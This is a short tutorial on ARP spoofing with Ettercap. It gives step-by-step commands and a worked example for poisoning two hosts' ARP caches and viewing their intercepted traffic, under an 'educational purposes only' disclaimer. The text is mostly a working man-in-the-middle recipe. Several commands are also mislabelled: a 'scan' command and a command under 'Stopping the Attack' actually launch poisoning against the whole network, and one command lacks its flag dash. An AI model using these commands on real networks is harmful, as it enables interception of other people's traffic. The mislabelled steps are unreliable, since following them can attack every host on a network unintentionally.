# Disclaimer
This tutorial is for educational purposes only. Perform ARP spoofing attacks only on networks you own or have explicit permission to test. Unauthorized use of ARP spoofing can be illegal and unethical.

# Prerequisites
Ettercap Installed: Ensure Ettercap is installed on your system (refer to the Installation section).
Network Interface: Identify the network interface you'll use (e.g., eth0 or wlan0).
# Steps
### 1. Identify Network Interface
First, determine the network interface you will use. You can list network interfaces using the ifconfig or ip command:

```bash
ifconfig
```
or

```bash
ip a
```
Note the interface name (e.g., eth0 or wlan0).

### 2. Launch Ettercap
Start Ettercap in graphical mode:

```bash
sudo ettercap G
```
or in text mode (if you prefer):

```bash
sudo ettercap -T -i eth0
```
### 3. Scan for Hosts
In graphical mode:

Go to Hosts > Scan for hosts.
Wait for the scan to complete.
In text mode:

```bash
sudo ettercap -T -i eth0 -M arp:remote // //
```
This command scans the entire network connected to eth0.

### 4. Add Hosts to Target List
In graphical mode:

Go to Hosts > Host list.
Select the target hosts you want to ARP spoof.
Add the first host to Target 1.
Add the second host to Target 2.
In text mode:

Identify the IP addresses of the target hosts from the scan results. Then, use their IP addresses in the following command:

```bash
sudo ettercap -T -M arp:remote /<target1_IP>/ /<target2_IP>/
```
Replace <target1_IP> and <target2_IP> with the actual IP addresses of the target hosts.

### 5. Start ARP Spoofing
In graphical mode:

Go to Mitm > ARP poisoning.
Select Sniff remote connections.
In text mode:

```bash
sudo ettercap -T -M arp:remote /<target1_IP>/ /<target2_IP>/
```
### 6. Monitor Traffic
In graphical mode:

Go to View > Connections to monitor intercepted connections.
Select a connection to view detailed information.
In text mode:

Ettercap will display intercepted traffic in the terminal.

Example Command in Text Mode
Here's a complete command sequence for ARP spoofing between two hosts with IP addresses 192.168.1.5 and 192.168.1.10 on interface eth0:

```bash
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.5/ /192.168.1.10/
```
Stopping the Attack
To stop the attack, press Ctrl+C in the terminal or close the Ettercap graphical interface.
```bash
ettercap -Tq -M arp:remote -i eth0 ///
```

